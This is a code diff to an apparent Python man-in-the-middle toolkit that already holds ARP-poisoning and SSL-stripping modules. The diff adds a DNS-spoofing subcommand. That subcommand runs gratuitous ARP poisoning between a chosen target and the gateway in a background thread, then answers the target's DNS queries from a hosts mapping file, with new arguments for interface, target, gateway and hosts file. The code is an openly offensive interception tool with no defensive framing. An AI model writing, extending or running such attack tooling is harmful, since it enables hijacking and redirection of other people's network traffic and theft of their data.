@@ -1,6 +1,7 @@
-import sys, argparse, time, psutil
+import sys, argparse, time, psutil, threading
 import arp_poison as arp
 import ssl_strip as ssl
+import dns_poison as dns
 #from scapy.all import sendp, ARP, Ether
 
 def arp_poison():
@@ -13,7 +14,11 @@ def arp_poison():
     return
 
 def dns_spoof():
-    args = parser_dns.parse_args()
+    if args.target_ip and args.gateway_ip:
+        print(f"[*] Starting background ARP poisoning: {args.target_ip} <-> {args.gateway_ip}")
+        t = threading.Thread(target=arp.grat_arp_poison, args=(args.iface, args.target_ip, args.gateway_ip), daemon=True)
+        t.start()
+    dns.run_dns_spoof(args.iface, args.target_ip, args.hosts_file)
     return
 
 def ssl_strip():
@@ -46,6 +51,10 @@ parser_arp_grat = subparsers_arp.add_parser('watcher')
 parser_arp.set_defaults(func=arp_poison)
 
 parser_dns = subparsers.add_parser('dns-spoof', aliases=['dns'])
+parser_dns.add_argument('-i', '--iface', required=True, help='Interface to listen on')
+parser_dns.add_argument('-t', '--target_ip', help='Only spoof this client IP')
+parser_dns.add_argument('-f', '--hosts_file', default='dns-file.txt', help='Host mapping file')
+parser_dns.add_argument('-g', '--gateway_ip', help='Gateway IP for ARP poisoning')
 parser_dns.set_defaults(func=dns_spoof)
 
 parser_ssl = subparsers.add_parser('ssl-strip', aliases=['ssl'])
